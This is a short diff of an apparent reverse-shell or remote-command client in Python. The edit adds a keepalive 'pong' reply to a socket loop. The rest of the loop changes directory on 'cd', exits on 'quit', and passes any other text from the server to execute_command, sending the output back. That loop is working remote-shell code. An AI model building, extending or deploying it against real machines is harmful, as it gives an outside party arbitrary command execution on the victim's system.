@@ -66,18 +66,21 @@ class Client:
                 received_server_data = self.client_socket.recv(20480)
                 if not received_server_data:
                     break
-
-                if received_server_data[:2].decode("utf-8") == 'cd':
-                    current_path = received_server_data[3:].decode("utf-8").strip()
-                    try:
-                        os.chdir(current_path)
-                        self.send_output("")
-                    except Exception as e:
-                        self.send_output(f"Directory change failed: {e}\n")
-                elif received_server_data.decode("utf-8") == "quit":
-                    break
+                # Need to add a random ID to each message so server can handle it
+                if received_server_data.decode("utf-8") == "thismessageneedstobechanged":
+                    self.client_socket.send("pong".encode("utf-8"))
                 else:
-                    self.execute_command(received_server_data.decode("utf-8"))
+                    if received_server_data[:2].decode("utf-8") == 'cd':
+                        current_path = received_server_data[3:].decode("utf-8").strip()
+                        try:
+                            os.chdir(current_path)
+                            self.send_output("")
+                        except Exception as e:
+                            self.send_output(f"Directory change failed: {e}\n")
+                    elif received_server_data.decode("utf-8") == "quit":
+                        break
+                    else:
+                        self.execute_command(received_server_data.decode("utf-8"))
             except OSError:
                 break
         self.client_socket.close()
